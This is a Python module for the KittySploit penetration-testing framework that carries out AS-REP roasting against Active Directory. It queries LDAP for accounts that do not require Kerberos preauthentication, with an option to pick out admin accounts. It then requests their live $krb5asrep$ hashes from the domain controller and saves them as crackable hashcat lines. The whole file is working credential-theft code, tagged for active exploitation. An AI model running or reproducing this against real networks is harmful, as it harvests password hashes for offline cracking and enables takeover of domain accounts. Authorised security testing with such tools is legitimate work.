from kittysploit import *
from lib.protocols.ldap.ldap_post_client import LdapPostClient
from lib.protocols.ldap.ad_helpers import UAC_NO_PREAUTH
from lib.protocols.kerberos.roast import KerberosError, request_asrep_hash
from lib.protocols.kerberos.roast_helpers import resolve_kdc
from lib.post.windows.hash_loot import save_hash_loot


class Module(Post, LdapPostClient):

	__info__ = {
		"name": "LDAP AS-REP Roast (native)",
		"description": (
			"Native AS-REP roasting: LDAP enum of UF_DONT_REQUIRE_PREAUTH accounts, "
			"then request live $krb5asrep$ hashes from the KDC (port 88). "
			"No Rubeus / Impacket required."
		),
		"author": "KittySploit Team",
		"session_type": SessionType.LDAP,
		"tags": ["ad", "ldap", "kerberos", "asrep", "native"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation", "network_probe"],
			"expected_requests": 4,
			"reversible": False,
			"approval_required": True,
			"produces": ["credentials", "risk_signals"],
			"cost": 0.9,
			"noise": 0.4,
			"value": 1.5,
			"chain": {
				"consumes_capabilities": ["ldap_access"],
				"produces_capabilities": ["asrep_targets", "kerberos_hashes"],
			},
		},
	}

	include_disabled = OptBool(False, "Include disabled accounts", False)
	admin_only = OptBool(False, "Only show adminCount=1 accounts", False)
	request_hashes = OptBool(True, "Request live AS-REP hashes from KDC", False)
	dc_ip = OptString("", "KDC host/IP (default: LDAP session host)", False)
	kdc_port = OptPort(88, "Kerberos KDC port", False)
	save_loot = OptBool(True, "Write hashcat lines to output/loot/", False)

	def run(self):
		try:
			print_info("=" * 80)
			print_status(f"AS-REP roastable users in {self.base_dn or '(domain)'}")
			filter_parts = [
				"(&(objectClass=user)",
				f"(userAccountControl:1.2.840.113556.1.4.803:={UAC_NO_PREAUTH})",
			]
			if not self.include_disabled:
				filter_parts.append("(!(userAccountControl:1.2.840.113556.1.4.803:=2))")
			filter_parts.append(")")
			rows = self.search(
				"".join(filter_parts),
				["sAMAccountName", "userPrincipalName", "adminCount", "distinguishedName"],
			)
			if self.admin_only:
				rows = [row for row in rows if self.attr_int(row, "adminCount") == 1]

			if not rows:
				print_warning("No AS-REP roastable accounts found")
				return True

			names = []
			for entry in rows:
				sam = self.attr_str(entry, "sAMAccountName")
				upn = self.attr_str(entry, "userPrincipalName")
				admin = self.attr_int(entry, "adminCount") == 1
				line = f"  {sam}"
				if upn:
					line += f" ({upn})"
				if admin:
					line += " [admin]"
				print_info(line)
				if sam:
					names.append(sam)

			print_info("=" * 80)
			print_success(f"Found {len(rows)} AS-REP roastable account(s)")

			if not self.request_hashes:
				print_info("Set request_hashes=true to pull live $krb5asrep$ hashes")
				return True

			kdc = resolve_kdc(self, str(self.dc_ip or ""))
			if not kdc:
				raise ProcedureError(
					FailureType.ConfigurationError,
					"KDC host unknown — set dc_ip or use an LDAP session with host",
				)
			domain = self.domain or ""
			if not domain:
				raise ProcedureError(FailureType.ConfigurationError, "Domain unknown")

			print_status(f"Requesting AS-REP hashes via {kdc}:{int(self.kdc_port)}")
			loot = []
			for sam in names:
				try:
					rh = request_asrep_hash(
						sam, domain, kdc, port=int(self.kdc_port or 88)
					)
					print_success(rh.hash)
					loot.append(rh.as_loot())
				except KerberosError as exc:
					print_warning(f"{sam}: {exc}")

			if loot and self.save_loot:
				path = save_hash_loot(
					loot, kind="krb5asrep", session_id=self._session_id_value()
				)
				if path:
					print_success(f"Loot saved: {path}")
			elif not loot:
				print_warning("No AS-REP hashes obtained")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"Native AS-REP roast failed: {exc}"
			)
